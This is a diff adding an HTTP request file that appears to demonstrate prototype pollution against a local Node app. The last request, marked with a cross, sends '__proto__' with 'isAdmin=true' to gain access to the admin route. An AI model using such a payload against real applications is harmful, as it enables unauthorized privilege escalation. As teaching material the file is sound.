@@ -1,0 +1,19 @@
+### Send an HTTP request: Normal request
+
+GET http://127.0.0.1:3000/
+
+
+### Send an HTTP request: Change the address to some other value
+
+GET http://127.0.0.1:3000/?type=business&field=address&value=789%20New%20Business%20Ave
+
+
+### Send an HTTP request: get the admin route but only if you are an admin user
+
+GET http://127.0.0.1:3000/admin
+
+
+### ❌ Send an HTTP request: manipulate the value field to create an isAdmin entry on the prototype
+
+GET http://127.0.0.1:3000/?type=__proto__&field=isAdmin&value=true
+
